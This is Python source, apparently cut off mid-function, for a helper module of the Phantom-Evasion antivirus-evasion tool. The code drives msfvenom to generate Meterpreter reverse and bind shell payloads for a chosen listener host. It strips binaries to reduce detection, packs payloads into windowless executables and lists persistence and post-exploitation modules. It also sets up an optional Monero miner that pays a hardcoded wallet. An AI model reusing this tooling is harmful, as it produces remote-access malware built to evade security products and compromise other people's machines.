


     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #  
     #    You should have received a copy of the GNU General Public License                 #
     #   along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.           #
     #                                                                                      #
     ########################################################################################


import subprocess,sys
import os,platform
import random
import string
from time import sleep 
from shutil import rmtree
from random import shuffle
import multiprocessing
sys.dont_write_bytecode = True

class bcolors:
    PURPLE = '\033[95m'
    BLUE = '\033[94m'
    DARKCYAN = '\033[36m'
    GREEN = '\033[92m'
    OCRA = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def python_banner():
    clear()
    py_version=platform.python_version()
    print(bcolors.OCRA + bcolors.BOLD + "\n[>] Python Version: " + bcolors.ENDC + bcolors.ENDC + py_version)
    sleep(0.5)

          
def RandString():
    varname = ""
    varname = ''.join(random.SystemRandom().choice(string.ascii_lowercase + string.ascii_uppercase) for _ in range(random.randint(8,18)))
    return varname 



def path_finder(filename):
    path = ""
    lookfor = filename
    
    if platform.system() == "Windows":

        for root, dirs, files in os.walk('C:\\'):
            if lookfor in files:
                path = os.path.join(root, lookfor)
                return path

def Enter2Continue():
    try:   
        ans=input("\n[>] Press Enter to continue") 
    except SyntaxError:
        pass

    pass

def InputFunc(Text):

    py_version=platform.python_version()

    if py_version[0] == "3":

        Ans = input(Text)

    else:

        Ans = raw_input(Text)

    return Ans    

def linux_isready():
    
    try:
        is_present=subprocess.check_output(['which','apt'],stderr=subprocess.STDOUT)

    except subprocess.CalledProcessError: 
        print(bcolors.RED + "[-] APT  [Not Found]\n")
        print("[-] Only dependencies check ( auto install not supported )\n")
        print(bcolors.OCRA + "[>] Checking dependencies:\n" + bcolors.ENDC)
        auto_check("apktool")
        Apktool_download()
        auto_check("gcc")
        auto_check("mingw-w64")
        auto_check("pyinstaller")
        auto_check("apksigner")
        auto_check("msfvenom")
        auto_check("msfconsole")
        auto_check("openssl")
        auto_check("strip")
        auto_check("wine")
        print(bcolors.GREEN + "\n[>] Completed!!\n" + bcolors.ENDC)
        sleep(1)
    else:
        print(bcolors.GREEN + "[>] APT [Found]" + bcolors.ENDC) 
        sleep(0.1)
        ubuntu_isready()
    


def kali_arch_isready():
    sleep(0.5)
    print(bcolors.OCRA + "[>] Checking dependencies:\n" + bcolors.ENDC)
    package = os.system("dpkg -l | grep libc6-dev-i386 >/dev/null 2>&1")

    if package == 0:
        print(bcolors.GREEN + "[>] Package libc6-dev-i386               [Found]\n" + bcolors.ENDC)
    else:
        print(bcolors.RED + "[>] Package libc6-dev-i386                 [Not Found]\n" + bcolors.ENDC)
        sleep(1)
        print(bcolors.GREEN + "[>] Trying to autoinstall:\n" + bcolors.ENDC)
        sleep(1)
        subprocess.call(['apt-get','install','libc6-dev-i386','-y'])
    sleep(0.5)
    auto_setup("apktool")
    Apktool_download()
    auto_setup("gcc")
    auto_setup("mingw-w64")
    auto_setup("pyinstaller")
    auto_setup("apksigner")
    auto_setup("msfvenom")
    auto_setup("msfconsole")
    auto_setup("openssl")
    auto_setup("strip")
    auto_setup("wine")    
    if wine_fastcheck() == True:
        sleep(0.2)
        print(bcolors.GREEN + "\n[>] Wine Environment Ready\n" + bcolors.ENDC)
        sleep(0.5)
    else:       
        wine_check()
    miner_advisor()
    print(bcolors.GREEN + "\n[>] Completed!!\n" + bcolors.ENDC)
    sleep(1)

def ubuntu_isready():
    sleep(0.5)

    print(bcolors.OCRA + "[>] Checking dependencies:\n" + bcolors.ENDC)
    package = os.system("dpkg -l | grep libc6-dev-i386 >/dev/null 2>&1")

    if package == 0:
        print(bcolors.GREEN + "[>] Package libc6-dev-i386               [Found]\n" + bcolors.ENDC)
    else:
        print(bcolors.RED + "[>] Package libc6-dev-i386                 [Not Found]\n" + bcolors.ENDC)
        sleep(1)
        print(bcolors.GREEN + "[>] Trying to autoinstall:\n" + bcolors.ENDC)
        sleep(1)
        subprocess.call(['apt-get','install','libc6-dev-i386','-y'])
    auto_setup("apktool")
    Apktool_download()
    auto_setup("gcc")
    auto_setup("mingw-w64")
    auto_setup("pyinstaller")
    auto_setup("apksigner")
    auto_setup("openssl")
    auto_setup("strip")
    auto_setup("wine")
    if wine_fastcheck() == True:
        sleep(0.2)
        print(bcolors.GREEN + "\n[>] Wine Env Ready\n" + bcolors.ENDC)
        sleep(0.5)
    else:       
        wine_check()

    miner_advisor()

    try:
        is_present=subprocess.check_output(['which','msfvenom'],stderr=subprocess.STDOUT)

    except subprocess.CalledProcessError: 
        print(bcolors.RED + "[-] Metasploit-Framework  [Not Found]\n")
        print("[-] you need to install metasploit framework manually\n")


    else:
        print(bcolors.GREEN + "[>] Metasploit-Framework  [Found]" + bcolors.ENDC) 
        sleep(0.1)    
        print(bcolors.GREEN + "\n[>] Completed!!\n" + bcolors.ENDC)
        sleep(1)

def auto_setup(name):
    name2=name
    numspace = " " * (35 - len(name))
    if "mingw-w64" in name:

        name2="i686-w64-mingw32-gcc"

    try:
        is_present=subprocess.check_output(['which',name2],stderr=subprocess.STDOUT)


    except subprocess.CalledProcessError: 
        print(bcolors.RED + "[-] " + name + numspace + "  [Not Found]\n" + bcolors.ENDC)
        sleep(0.2)
        print(bcolors.GREEN + "[>] Trying to autoinstall\n" + bcolors.ENDC)
        sleep(1)
        subprocess.call(['apt-get','install',name,'-y'])
    else:
        print(bcolors.GREEN + "[+] " + name + numspace + "  [Found]" + bcolors.ENDC) 
        sleep(0.1)

def auto_check(name):
    name2=name
    numspace = " " * (35 - len(name))
    if "mingw-w64" in name:

        name2="i686-w64-mingw32-gcc"

    try:
        is_present=subprocess.check_output(['which',name2],stderr=subprocess.STDOUT)


    except subprocess.CalledProcessError: 
        print(bcolors.RED + "[-] " + name + numspace + "  [Not Found]\n" + bcolors.ENDC)
        sleep(1)
    else:
        print(bcolors.GREEN + "[+] " + name + numspace + "  [Found]\n" + bcolors.ENDC) 
        sleep(0.1)



def Apktool_download():
    numspace = " " * (35 - len("apktool.jar file"))
    if os.path.isfile("Setup/apk_sign/apktool_2.3.3.jar") != True:

        print(bcolors.RED + "[+] apktool.jar file" + numspace + "  [Not Found]\n" + bcolors.ENDC)
        sleep(0.5)
        print(bcolors.GREEN + "[>] Trying to download from https://ibotpeaches.github.io/Apktool:\n" + bcolors.ENDC)
        sleep(0.1)
        PH_dir=os.getcwd()
        os.chdir("Setup/apk_sign")
        os.system("wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.3.3.jar || curl -O https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.3.3.jar")
        os.chdir(PH_dir)

    else:

        print(bcolors.GREEN + "[+] apktool.jar file" + numspace + "  [Found]" + bcolors.ENDC)
        sleep(0.1)
        

    


def dependencies_checker():
    platform_used=""
    platform_used=platform.system()
    release_used=""
    release_used=platform.platform()
                          
    if platform_used == "Linux":

        if "kali" in release_used:

            if "rolling" in release_used:

                print(bcolors.OCRA + bcolors.BOLD + "\n[>] Kali-Rolling Detected!!\n" + bcolors.ENDC + bcolors.ENDC)
                sleep(1)

            elif "rolling" not in release_used:

                print(bcolors.OCRA + bcolors.BOLD + "\n[>] Kali 2 Detected!!\n" + bcolors.ENDC + bcolors.ENDC)
                sleep(1)

            kali_arch_isready()

        elif "Ubuntu" in release_used:                
                
            print(bcolors.OCRA + bcolors.BOLD + "\n[>] Ubuntu Detected!!\n" + bcolors.ENDC + bcolors.ENDC)
            sleep(1)
            ubuntu_isready()

        else:
            print(bcolors.OCRA + bcolors.BOLD + "\n[>] Linux distro Detected!! \n" + bcolors.ENDC + bcolors.ENDC)
            sleep(1)
            linux_isready()

    elif platform_used == "Windows":

        print(bcolors.RED + bcolors.BOLD + "\n[>] Windows Detected!!\n" + bcolors.ENDC + bcolors.ENDC)
        sleep(1)
        print("[-] Auto install not supported\n")
        sleep(0.2)
        print("[-] Check README to properly install the dependencies\n")
        sleep(1)
        Enter2Continue()

def strip_tease(Filename):
    py_version=platform.python_version()
    print(bcolors.OCRA + bcolors.BOLD + "\n[>] Strip \n" + bcolors.ENDC + bcolors.ENDC)
    print("strip is a GNU utility to \"strip\" symbols from object files.\n")
    print("This is useful for minimizing their file size, streamlining them for distribution.\n")
    print("It can also be useful for making it more difficult to reverse-engineer the compiled code.\n")
    print("(Lower rate of detection)\n")

    RequireStrip = YesOrNo(InputFunc("\n[>] Strip executable? (y/n):"))


    if RequireStrip == "True":
        sleep(0.5)
        print(bcolors.GREEN + "\n[>] Stripping...\n"  + bcolors.ENDC)
        sleep(1)
        subprocess.call(['strip',Filename])

def wine_fastcheck():
    wine=False
    wineok = open("Setup/Config.txt","r")
    for line in wineok:
        if "WinEnv=OK" in line:
            wine=True
    return wine
   

def wine_check():
    FLAG1=""
    FLAG2=""
    print(bcolors.OCRA + bcolors.BOLD + "[+] Wine Environment check" + bcolors.ENDC + bcolors.ENDC)
    try:
        py_check=subprocess.check_output(['wine','python','-v'],stderr=subprocess.STDOUT)

    except subprocess.CalledProcessError: 
        print(bcolors.RED + bcolors.BOLD + "\n[Wine] Python Not Found\n" + bcolors.ENDC + bcolors.ENDC)
        print("In order to use windows wine-pyinstaller modules you need to\n install python on wine manually (\"wine python --version\" to check if it's reachable from commandline)\n")
        Enter2Continue() 
        
        
    else:

        if "cannot find" in py_check:
            print(bcolors.RED + bcolors.BOLD + "\n[Wine] Python Not Found\n" + bcolors.ENDC + bcolors.ENDC)
            print("In order to use windows wine-pyinstaller modules you need to\n manually install python on wine manually (\"wine python --version\" to check if python is reachable from commandline)\n")
            Enter2Continue()
        else:

            print(bcolors.GREEN + "[Wine] Python Found" + bcolors.ENDC)
            FLAG1="OK"
            
    try:

        pyin_check=subprocess.check_output(['wine','pyinstaller','-v'],stderr=subprocess.STDOUT)

    except subprocess.CalledProcessError:

        print(bcolors.RED + bcolors.BOLD + "\n[Wine] Pyinstaller Not Found\n" + bcolors.ENDC + bcolors.ENDC)
        print("In order to use windows wine-pyinstaller modules you need to\n manually install pyinstaller on wine (\"wine pyinstaller -v\" to check if pyinstaller is reachable from commandline)\n")
        Enter2Continue() 
        

    else:
        if "cannot find" in pyin_check:
            print(bcolors.RED + bcolors.BOLD + "\n[Wine] Pyinstaller Not Found\n" + bcolors.ENDC + bcolors.ENDC)
            print("In order to use windows wine-pyinstaller modules you need to\n manually install pyinstaller on wine (\"wine pyinstaller -v\" to check if pyinstaller is reachable from commandline)\n")
            Enter2Continue() 

        else:

            print(bcolors.GREEN + "[Wine] Pyinstaller Found" + bcolors.ENDC )
            FLAG2="OK"        
    sleep(0.5)

    if FLAG1=="OK":
        if FLAG2=="OK":
            new_conf=""
            wineok = open("Setup/Config.txt","r")
            for line in wineok:
                new_conf += line.replace("WinEnv=Check","WinEnv=OK")
            with open("Setup/Config.txt", "w") as conf:
                conf.write(new_conf)

def miner_advisor():

    sleep(0.2)

    py_version=platform.python_version()
    filename="Setup/Config.txt"

    donate_config = open(filename, "r")

    for line in donate_config:

        if "Miner=FirstRun" in line:

            print(bcolors.OCRA + "\n[Optional] XMR-STAK setup: " + bcolors.ENDC + "In order to support the developer of this tool,\nyou can help out by allowing the program to install a Monero Miner\nalong side the program's main functionality.\nThe miner will be configured to use a low amount of system resources\nduring phantom-evasion execution and can be deactivated at any time\nshould you wish to do so" + bcolors.ENDC)

            ans=InputFunc("\n[>]Install optional miner(y/n):")

            if (ans == "y") or ( ans == "Y"):

                print("\n[>] Installing Xmr-stak\n ")
                xmr_setup()
                new_conf=""
                config = open(filename, "r")

                for line in config:

                    line=line.replace("Miner=FirstRun","Miner=Installed")
                    new_conf+=line

                with open("Setup/Config.txt", "w") as configw:

                        configw.write(new_conf)
            else:

                print("\n[>] Xmr-stak will not be installed\n")
                new_conf=""
                config = open(filename, "r")
                for line in config:
                    line=line.replace("Miner=FirstRun","Miner=Refused")
                    new_conf+=line

                config.close()

                with open("Setup/Config.txt", "w") as configw:

                    configw.write(new_conf)
                    configw.close()

            sleep(2)

def xmr_setup():

    os.system("xterm -e \"mkdir Setup/Donate ;cd Setup/Donate ;apt install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev -y ;git clone https://github.com/fireice-uk/xmr-stak.git ;mkdir xmr-stak/build ;cd xmr-stak/build ;cmake .. -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF ; make install\"")

    username = ''.join(random.SystemRandom().choice(string.ascii_lowercase + string.digits) for _ in range(random.randint(12,16)))

    with open("Setup/Config.txt", "r") as config:

        new_conf=""

        for line in config:

            new_conf+=line

        new_conf+="Mining=True\n"
        new_conf+="Username=" + username + "\n"
        config.close()

    with open("Setup/Config.txt", "w") as config:

        config.write(new_conf)
        config.close()

    miner_config2 = ""
    miner_config2 += "\"call_timeout\" : 10,\n"
    miner_config2 += "\"retry_time\" : 30,\n"
    miner_config2 += "\"giveup_limit\" : 0,\n"
    miner_config2 += "\"verbose_level\" : 3,\n"
    miner_config2 += "\"print_motd\" : true,\n"
    miner_config2 += "\"h_print_time\" : 60,\n"
    miner_config2 += "\"aes_override\" : null,\n"
    miner_config2 += "\"use_slow_memory\" : \"warn\",\n"
    miner_config2 += "\"tls_secure_algo\" : true,\n"
    miner_config2 += "\"daemon_mode\" : false,\n"
    miner_config2 += "\"flush_stdout\" : false,\n"
    miner_config2 += "\"output_file\" : \"\",\n"
    miner_config2 += "\"httpd_port\" : 0,\n"
    miner_config2 += "\"http_login\" : \"\",\n" 
    miner_config2 += "\"http_pass\" : \"\",\n"
    miner_config2 += "\"prefer_ipv4\" : true,\n"

    with open("Setup/Donate/xmr-stak/build/bin/config.txt", "w") as xmrconfig:

        xmrconfig.write(miner_config2)
        xmrconfig.close()

    pool_config = ""
    pool_config += "\"pool_list\" :\n"
    pool_config += "[\n"
    pool_config += "	{\"pool_address\" : \"gulf.moneroocean.stream:10001\", \"wallet_address\" : \"474DTYXuUvKPt4uZm6aHoB7hPY3afNGT1A3opgv9ervJWph7e2NQGbU9ALS2VfZVEgKYwgUp7z8PxPx2u2CAqusPJgxaiXy\",\"rig_id\" : \"\", \"pool_password\" : \"" + username + "\", \"use_nicehash\" : false, \"use_tls\" : false, \"tls_fingerprint\" : \"\", \"pool_weight\" : 1 },\n"
    pool_config += "],\n"
    pool_config += "\"currency\" : \"monero7\",\n"

    with open("Setup/Donate/xmr-stak/build/bin/pools.txt", "w") as poolconfig:
        poolconfig.write(pool_config)
        poolconfig.close()


    cpu_config = ""
    cpu_config += "\"cpu_threads_conf\" :\n"
    cpu_config += "[\n\n"

    Thread_num = multiprocessing.cpu_count()

    if Thread_num == 2:

        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 0 },\n"

    elif Thread_num == 4:
        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 0 },\n"

    elif Thread_num == 6:
        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 0 },\n"
        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 1 },\n"

    elif Thread_num == 8:
        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 0 },\n"
        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 1 },\n"

    elif Thread_num == 12:
        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 0 },\n"
        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 1 },\n"
        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 2 },\n"

    elif Thread_num >= 16:

        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 0 },\n"
        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 1 },\n"    
        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 2 },\n"
        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 3 },\n"

    else:
        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 0 },\n"

    cpu_config += "\n],\n"

    with open("Setup/Donate/xmr-stak/build/bin/cpu.txt", "w") as cpuconfig:
        cpuconfig.write(cpu_config)
        cpuconfig.close()

def advisor():
    clear()
    print(bcolors.RED + "[DISCLAIMER]:" + bcolors.ENDC + "Phantom-Evasion is intended to be used for legal security")
    print("purposes only any other use is not under the responsibility of the developer\n") 
    sleep(0.2)
    print(bcolors.RED + "[+] Developed by:" + bcolors.ENDC + " Diego Cornacchini  \n")
    sleep(0.2)
    print(bcolors.RED + "[+] GITHUB: " + bcolors.ENDC + "https://github.com/oddcod3 \n")
    sleep(0.2)
    print(bcolors.RED + "[+] VERSION: " + bcolors.ENDC + "1.2 \n")
    sleep(0.2)
    print(bcolors.RED + "[+] MODULES: " + bcolors.ENDC + "24\n")
    sleep(0.2)
    print(bcolors.RED + "[+] NEW FEATURES: " + bcolors.ENDC + "Pure C meterpreter stager,Persistence modules \n")
  

    sleep(3)
    

def clear():
    subprocess.Popen( "cls" if platform.system() == "Windows" else "clear", shell=True)
    sleep(0.1)

def banner():
    bann= "\n\n"
    bann += "                       _                 _                        \n" 
    bann += "                 _ __ | |__   __ _ _ __ | |_ ___  _ __ ___        \n"
    bann += "                | '_ \| '_ \ / _` | '_ \| __/ _ \| '_ ` _ \       \n"
    bann += "                | |_) | | | | (_| | | | | || (_) | | | | | |      \n"
    bann += "                | .__/|_| |_|\__,_|_| |_|\__\___/|_| |_| |_|      \n"
    bann += "                |_|   / _ \ \ / / _` / __| |/ _ \| '_ \           \n"
    bann += "                     |  __/\ V / (_| \__ \ | (_) | | | |          \n"
    bann += "                      \___| \_/ \__,_|___/_|\___/|_| |_|          \n"
    bann += "                                                        v1.2      \n"
    sleep(0.3)
    print(bcolors.RED + bcolors.BOLD + bann  + bcolors.ENDC + bcolors.ENDC)
  
def exit_banner():

    print("      *     .--. .-,       .-..-.__                ___        *              ")
    print("  .       .'(`.-` \_.-'-./`  |\_( \"\__   *        /   \           .         ")     
    print("       __.>\ ';  _;---,._|   / __/`'--)          / \ / \                *    ")
    print("      /.--.  : |/' _.--.<|  /  | |              |   @   |       *            ")                                    
    print("  _..-'    `\     /' /`  /_/ _/_/             , |       | ,                  ")
    print(" >_.-``-. `Y  /' _;---.`|/))))      *         \/(       )\/        .         ")
    print("'` .-''. \|:  \.'   __, .-'\"`                   | )   ( |                   ")
    print(" .'--._ `-:  \/:  /'  '.\             _|_       |(     )|                    ")
    print("     /.'`\ :;   /'      `-           `-|-`      ||   | |'            *       ")
    print("    -`    |     |                      |         |   | |                     ")
    print("          :.; : |        *         .-'~^~`-.     |   | |                     ")
    print("          |:    |                .'  HEUR   `.   |   /-'                     ")
    print("          |:.   |                |   RIP     |   |_.'                        ")
    print("          :. :  |                |   here    |                               ")
    print("         ,... : ;                | 31/10/2017|                               ")
    print("-.\"-/\\\/:::.    `\.\"-._-_'.\"-\"_\\-|...........|///..-..--.-.-.-..-..-\"-..-") 

def python_sys_completer(wine):
    clear()
    py_version=platform.python_version()
    print(bcolors.OCRA + "[Python dropper]"  + bcolors.ENDC + " Choose how to supply commandline payload:\n")
    print("[1] Custom commandline payload\n")
    print("[0] Back\n")

    ans=InputFunc("\n[>] Please insert choice\'s number: ")

    if ans == "1":

        ans=InputFunc("\n[>]  Insert oneline payload: ")

        pytherpreter_launcher(ans,"Python_Polymorphic_Powershelloneline",wine)


def xmr_miner():

    subprocess.call(['tmux','send-keys','-t','phantom-miner','\"\x03\"','C-m'], stdout=open(os.devnull,'wb'), stderr=open(os.devnull,'wb'))
    sleep(0.25)
    os.system('tmux new -s phantom-miner -d \"./Setup/Donate/xmr-stak/build/bin/xmr-stak -c Setup/Donate/xmr-stak/build/bin/config.txt -C Setup/Donate/xmr-stak/build/bin/pools.txt --cpu Setup/Donate/xmr-stak/build/bin/cpu.txt \"') 

def pytherpreter_completer(module_type,wine):

    clear()

    print(bcolors.OCRA + "\n[<Pytherpreter>] choose meterpreter payload:\n\n"  + bcolors.ENDC)
    print("[+] python/meterpreter/reverse_tcp\n")
    print("[+] python/meterpreter/reverse_http\n")
    print("[+] python/meterpreter/reverse_https\n")
    print("[+] python/meterpreter/bind_tcp\n")

    ans=InputFunc("\n[>] Please type one of the following payload: ")

    if "reverse" in ans:

        Lhost = InputFunc("\n[>] Please insert LHOST: ")
        Lport = InputFunc("\n[>] Please insert LPORT: ")        
        Host= "LHOST=" + str(Lhost)
        Port= "LPORT=" + str(Lport)

    elif "bind" in ans:

        Rhost = InputFunc("\n[>] Please insert RHOST: ")
        Rport = InputFunc("\n[>] Please insert RPORT: ")
        Host= "RHOST=" + str(Rhost)
        Port= "RPORT=" + str(Rport)

    print(bcolors.GREEN + "\n[>] Generating code...\n"  + bcolors.ENDC)

    if platform.system == "Windows":

        Paytime = subprocess.check_output(['msfvenom','-p',ans,'--platform','Python','-a','python',Host,Port],shell=True)
    else:

        Paytime = subprocess.check_output(['msfvenom','-p',ans,'--platform','Python','-a','python',Host,Port])

    pytherpreter_launcher(Paytime,module_type,wine)
    

def pytherpreter_launcher(rec_Payload,module_type,wine):

    generated_pyth=str(rec_Payload)

    Filename=InputFunc(bcolors.OCRA + "\n[>] Please insert output filename:" + bcolors.ENDC)

    Filename+=".py"

    if platform.system() == "Linux" :

        if module_type == "Pytherpreter":

            subprocess.call(['python','Modules/payloads/Pytherpreter_10^8++.py',generated_pyth,Filename])

        elif module_type == "Pytherpreter_Polymorphic":

            subprocess.call(['python','Modules/payloads/Pytherpreter_Polymorphic.py',generated_pyth,Filename,wine])

        elif module_type == "Python_Polymorphic_Powershelloneline":

            subprocess.call(['python','Modules/payloads/Python_Polymorphic_Powershelloneline.py',generated_pyth,Filename,wine])
        
    elif platform.system() == "Windows":

        if module_type == "Pytherpreter":

            subprocess.call(['py','Modules/payloads/Pytherpreter_10^8++.py',generated_pyth,Filename])

        elif module_type == "Pytherpreter_Polymorphic":

            subprocess.call(['py','Modules/payloads/Pytherpreter_Polymorphic.py',generated_pyth,Filename,wine])

        elif module_type == "Python_Polymorphic_Powershelloneline":

            subprocess.call(['py','Modules/payloads/Python_Polymorphic_Powershelloneline.py',generated_pyth,Filename,wine])

    auto_pyinstall(Filename,wine)   

def auto_pyinstall(filename,wine):

    if wine == False:

        ans=InputFunc(bcolors.OCRA + "\n[>] Use Pyinstaller to create (current platform type) executable file?(y/n): "  + bcolors.ENDC)

        if ans == "y":

            if platform.system() == "Linux":

                subprocess.call(['pyinstaller','--noconsole',filename,'-F','--noupx','--hidden-import','code','--hidden-import','platform','--hidden-import','shutil'])
            
            elif platform.system() == "Windows":
                path2pyinstaller=path_finder("pyinstaller.py")
                subprocess.call(['py',path2pyinstaller,'--noconsole',filename,'-F','--noupx','--hidden-import','code','--hidden-import','platform','--hidden-import','shutil'])

            sleep(2)  

            filename=filename.replace(".py",".exe")
            bwd=str("dist/" + filename)
            sleep(1)
            os.rename(bwd,filename)
            rmtree("build")
            os.remove(filename + ".spec")
            os.rmdir("dist")
            sleep(0.5) 
            print(bcolors.GREEN + "\n[>] Executable saved in Phantom-Evasion folder" + bcolors.ENDC) 
            Enter2Continue()
  
        else:
            print(bcolors.GREEN + "\n[>] Python-file saved in Phantom-Evasion folder"  + bcolors.ENDC)
            Enter2Continue()


    else:

        if platform.system() == "Linux":

            subprocess.call(['wine','pyinstaller','--noconsole',filename,'-F','--noupx','--hidden-import','code','--hidden-import','platform','--hidden-import','shutil'])

            
        elif platform.system() == "Windows":
            path2pyinstaller=path_finder("pyinstaller.py")
            subprocess.call(['py',path2pyinstaller,'--noconsole',filename,'-F','--noupx','--hidden-import','code','--hidden-import','platform','--hidden-import','shutil'])
            
        sleep(1)  
        filename=filename.replace(".py",".exe")
        bwd=str("dist/" + filename)
        os.rename(bwd,filename)
        rmtree("build")
        filename=filename.replace(".exe","")
        os.remove(filename + ".spec")
        os.rmdir("dist")
        sleep(0.5) 
        print(bcolors.GREEN + "\n[>] Executable saved in Phantom-Evasion folder" + bcolors.ENDC)   
        Enter2Continue() 


def menu_options():

    print("    =====================================================================")
    print("  ||"+ bcolors.OCRA + "        [MAIN MENU]" + bcolors.ENDC + ":             ||                                  || ")
    print("  ||                                 ||                                  || ")
    print("  ||    [" + bcolors.OCRA + "1" + bcolors.ENDC + "]  Windows modules         ||   [" + bcolors.OCRA + "5" + bcolors.ENDC + "]  Universal modules         || ")
    print("  ||                                 ||                                  || ")
    print("  ||    [" + bcolors.OCRA + "2" + bcolors.ENDC + "]  Linux modules           ||   [" + bcolors.OCRA + "6" + bcolors.ENDC + "]  Post-Exploitation modules || ")
    print("  ||                                 ||                                  || ")
    print("  ||    [" + bcolors.OCRA + "3" + bcolors.ENDC + "]  OSX modules             ||   [" + bcolors.OCRA + "7" + bcolors.ENDC + "]  Update check              || ")
    print("  ||                                 ||                                  || ")
    print("  ||    [" + bcolors.OCRA + "4" + bcolors.ENDC + "]  Android modules         ||   [" + bcolors.OCRA + "0" + bcolors.ENDC + "]  Exit                      || ")
    print("  ||                                 ||                                  || ")
    print("    =====================================================================")


def payload_advisor(payload,module_choice):
    if "windows" in payload:
        print("[>] Invalid Payload\n")
        print("[Warning] The following list of payloads needs to be supplied using \ncustom shellcode options:\n")
        print("> windows/format_all_drives \n> windows/exec\n> windows/download_exec \n> windows/dns_txt_query_exec \n> windows/dllinject/find_tag")
        print("> windows/vncinject/find_tag\n> windows/speak_pwned\n> windows/shell/find_tag\n> windows/patchupmeterpreter/find_tag") 
        print("> windows/patchupmeterpreter/find_tag \n> windows/patchupdllinject/find_tag\n> windows/messagebox\n> windows/loadlibrary")
        print("\n[>] including respective x64 payloads\n")
    elif "linux" in payload:
        print("[>] Invalid Payload\n")
        print("[Warning] The following list of payloads needs to be supplied using \ncustom shellcode options:\n")
        print("> linux/x86/shell_find_tag\n> linux/x86/shell_find_port\n> linux/x86/shell/find_tag\n> linux/x86/read_file \n> linux/x86/meterpreter/find_tag")
        print("> linux/x86/exec\n> linux/x86/chmod\n> linux/x86/adduser\n") 
        print("\n[>] including respective x64 payloads\n")
    Enter2Continue()
    if ("Powershell" in module_choice):
        powershell_completer(module_choice)
    else:
        shellcode_completer(module_choice)


def payload_generator(msfvenom_payload,arch,host,port,CustomOpt,payload_format):
    py_version=platform.python_version()    

    Randiter = str(random.randint(1,2))
    platform == ""
 

    if "reverse" in msfvenom_payload:

        Host= "LHOST=" + str(host)
        Port= "LPORT=" + str(port)

    if "bind" in msfvenom_payload: 

        Host= "RHOST=" + str(host)
        Port= "RPORT=" + str(port)

    if platform.system() == "Windows":

        if py_version[0] == "3":

            if payload_format == "c":

                if CustomOpt != "":

                    CustomOpt=CustomOpt.split()

                    if arch == "x86":

                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-i',Randiter]
                        ARGs += CustomOpt
                        ARGs += ['-b','\'\\x00\\x0a\\x0d\'','-f','c']

                        Payload = subprocess.run(ARGs,shell=True, stdout=subprocess.PIPE).stdout.decode('utf-8')

                    if arch == "x64":


                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-i',Randiter]
                        ARGs += CustomOpt
                        ARGs += ['-b','\'\\x00\\x0a\\x0d\'','-f','c']

                        Payload = subprocess.run(ARGs,shell=True, stdout=subprocess.PIPE).stdout.decode('utf-8')

                else:


                    if arch == "x86":

                        Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'],shell=True, stdout=subprocess.PIPE).stdout.decode('utf-8')

                    if arch == "x64":

                        Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'],shell=True, stdout=subprocess.PIPE).stdout.decode('utf-8')

            if payload_format == "psh":

                if CustomOpt != "":

                    CustomOpt=CustomOpt.split()

                    ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch]
                    ARGs += CustomOpt
                    ARGs += ['-f','psh']

                    Payload = subprocess.run(ARGs,shell=True, stdout=subprocess.PIPE).stdout.decode('utf-8')

                else:

                    Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'-f','psh'],shell=True, stdout=subprocess.PIPE).stdout.decode('utf-8')


        else:

            if payload_format == "c":

                if CustomOpt != "":

                    CustomOpt=CustomOpt.split()

                    if arch == "x86":


                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-i',Randiter]
                        ARGs += CustomOpt
                        ARGs += ['-b','\'\\x00\\x0a\\x0d\'','-f','c']  

                        Payload = subprocess.check_output(ARGs,shell=True)

                    if arch == "x64":

                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-i',Randiter]
                        ARGs += CustomOpt
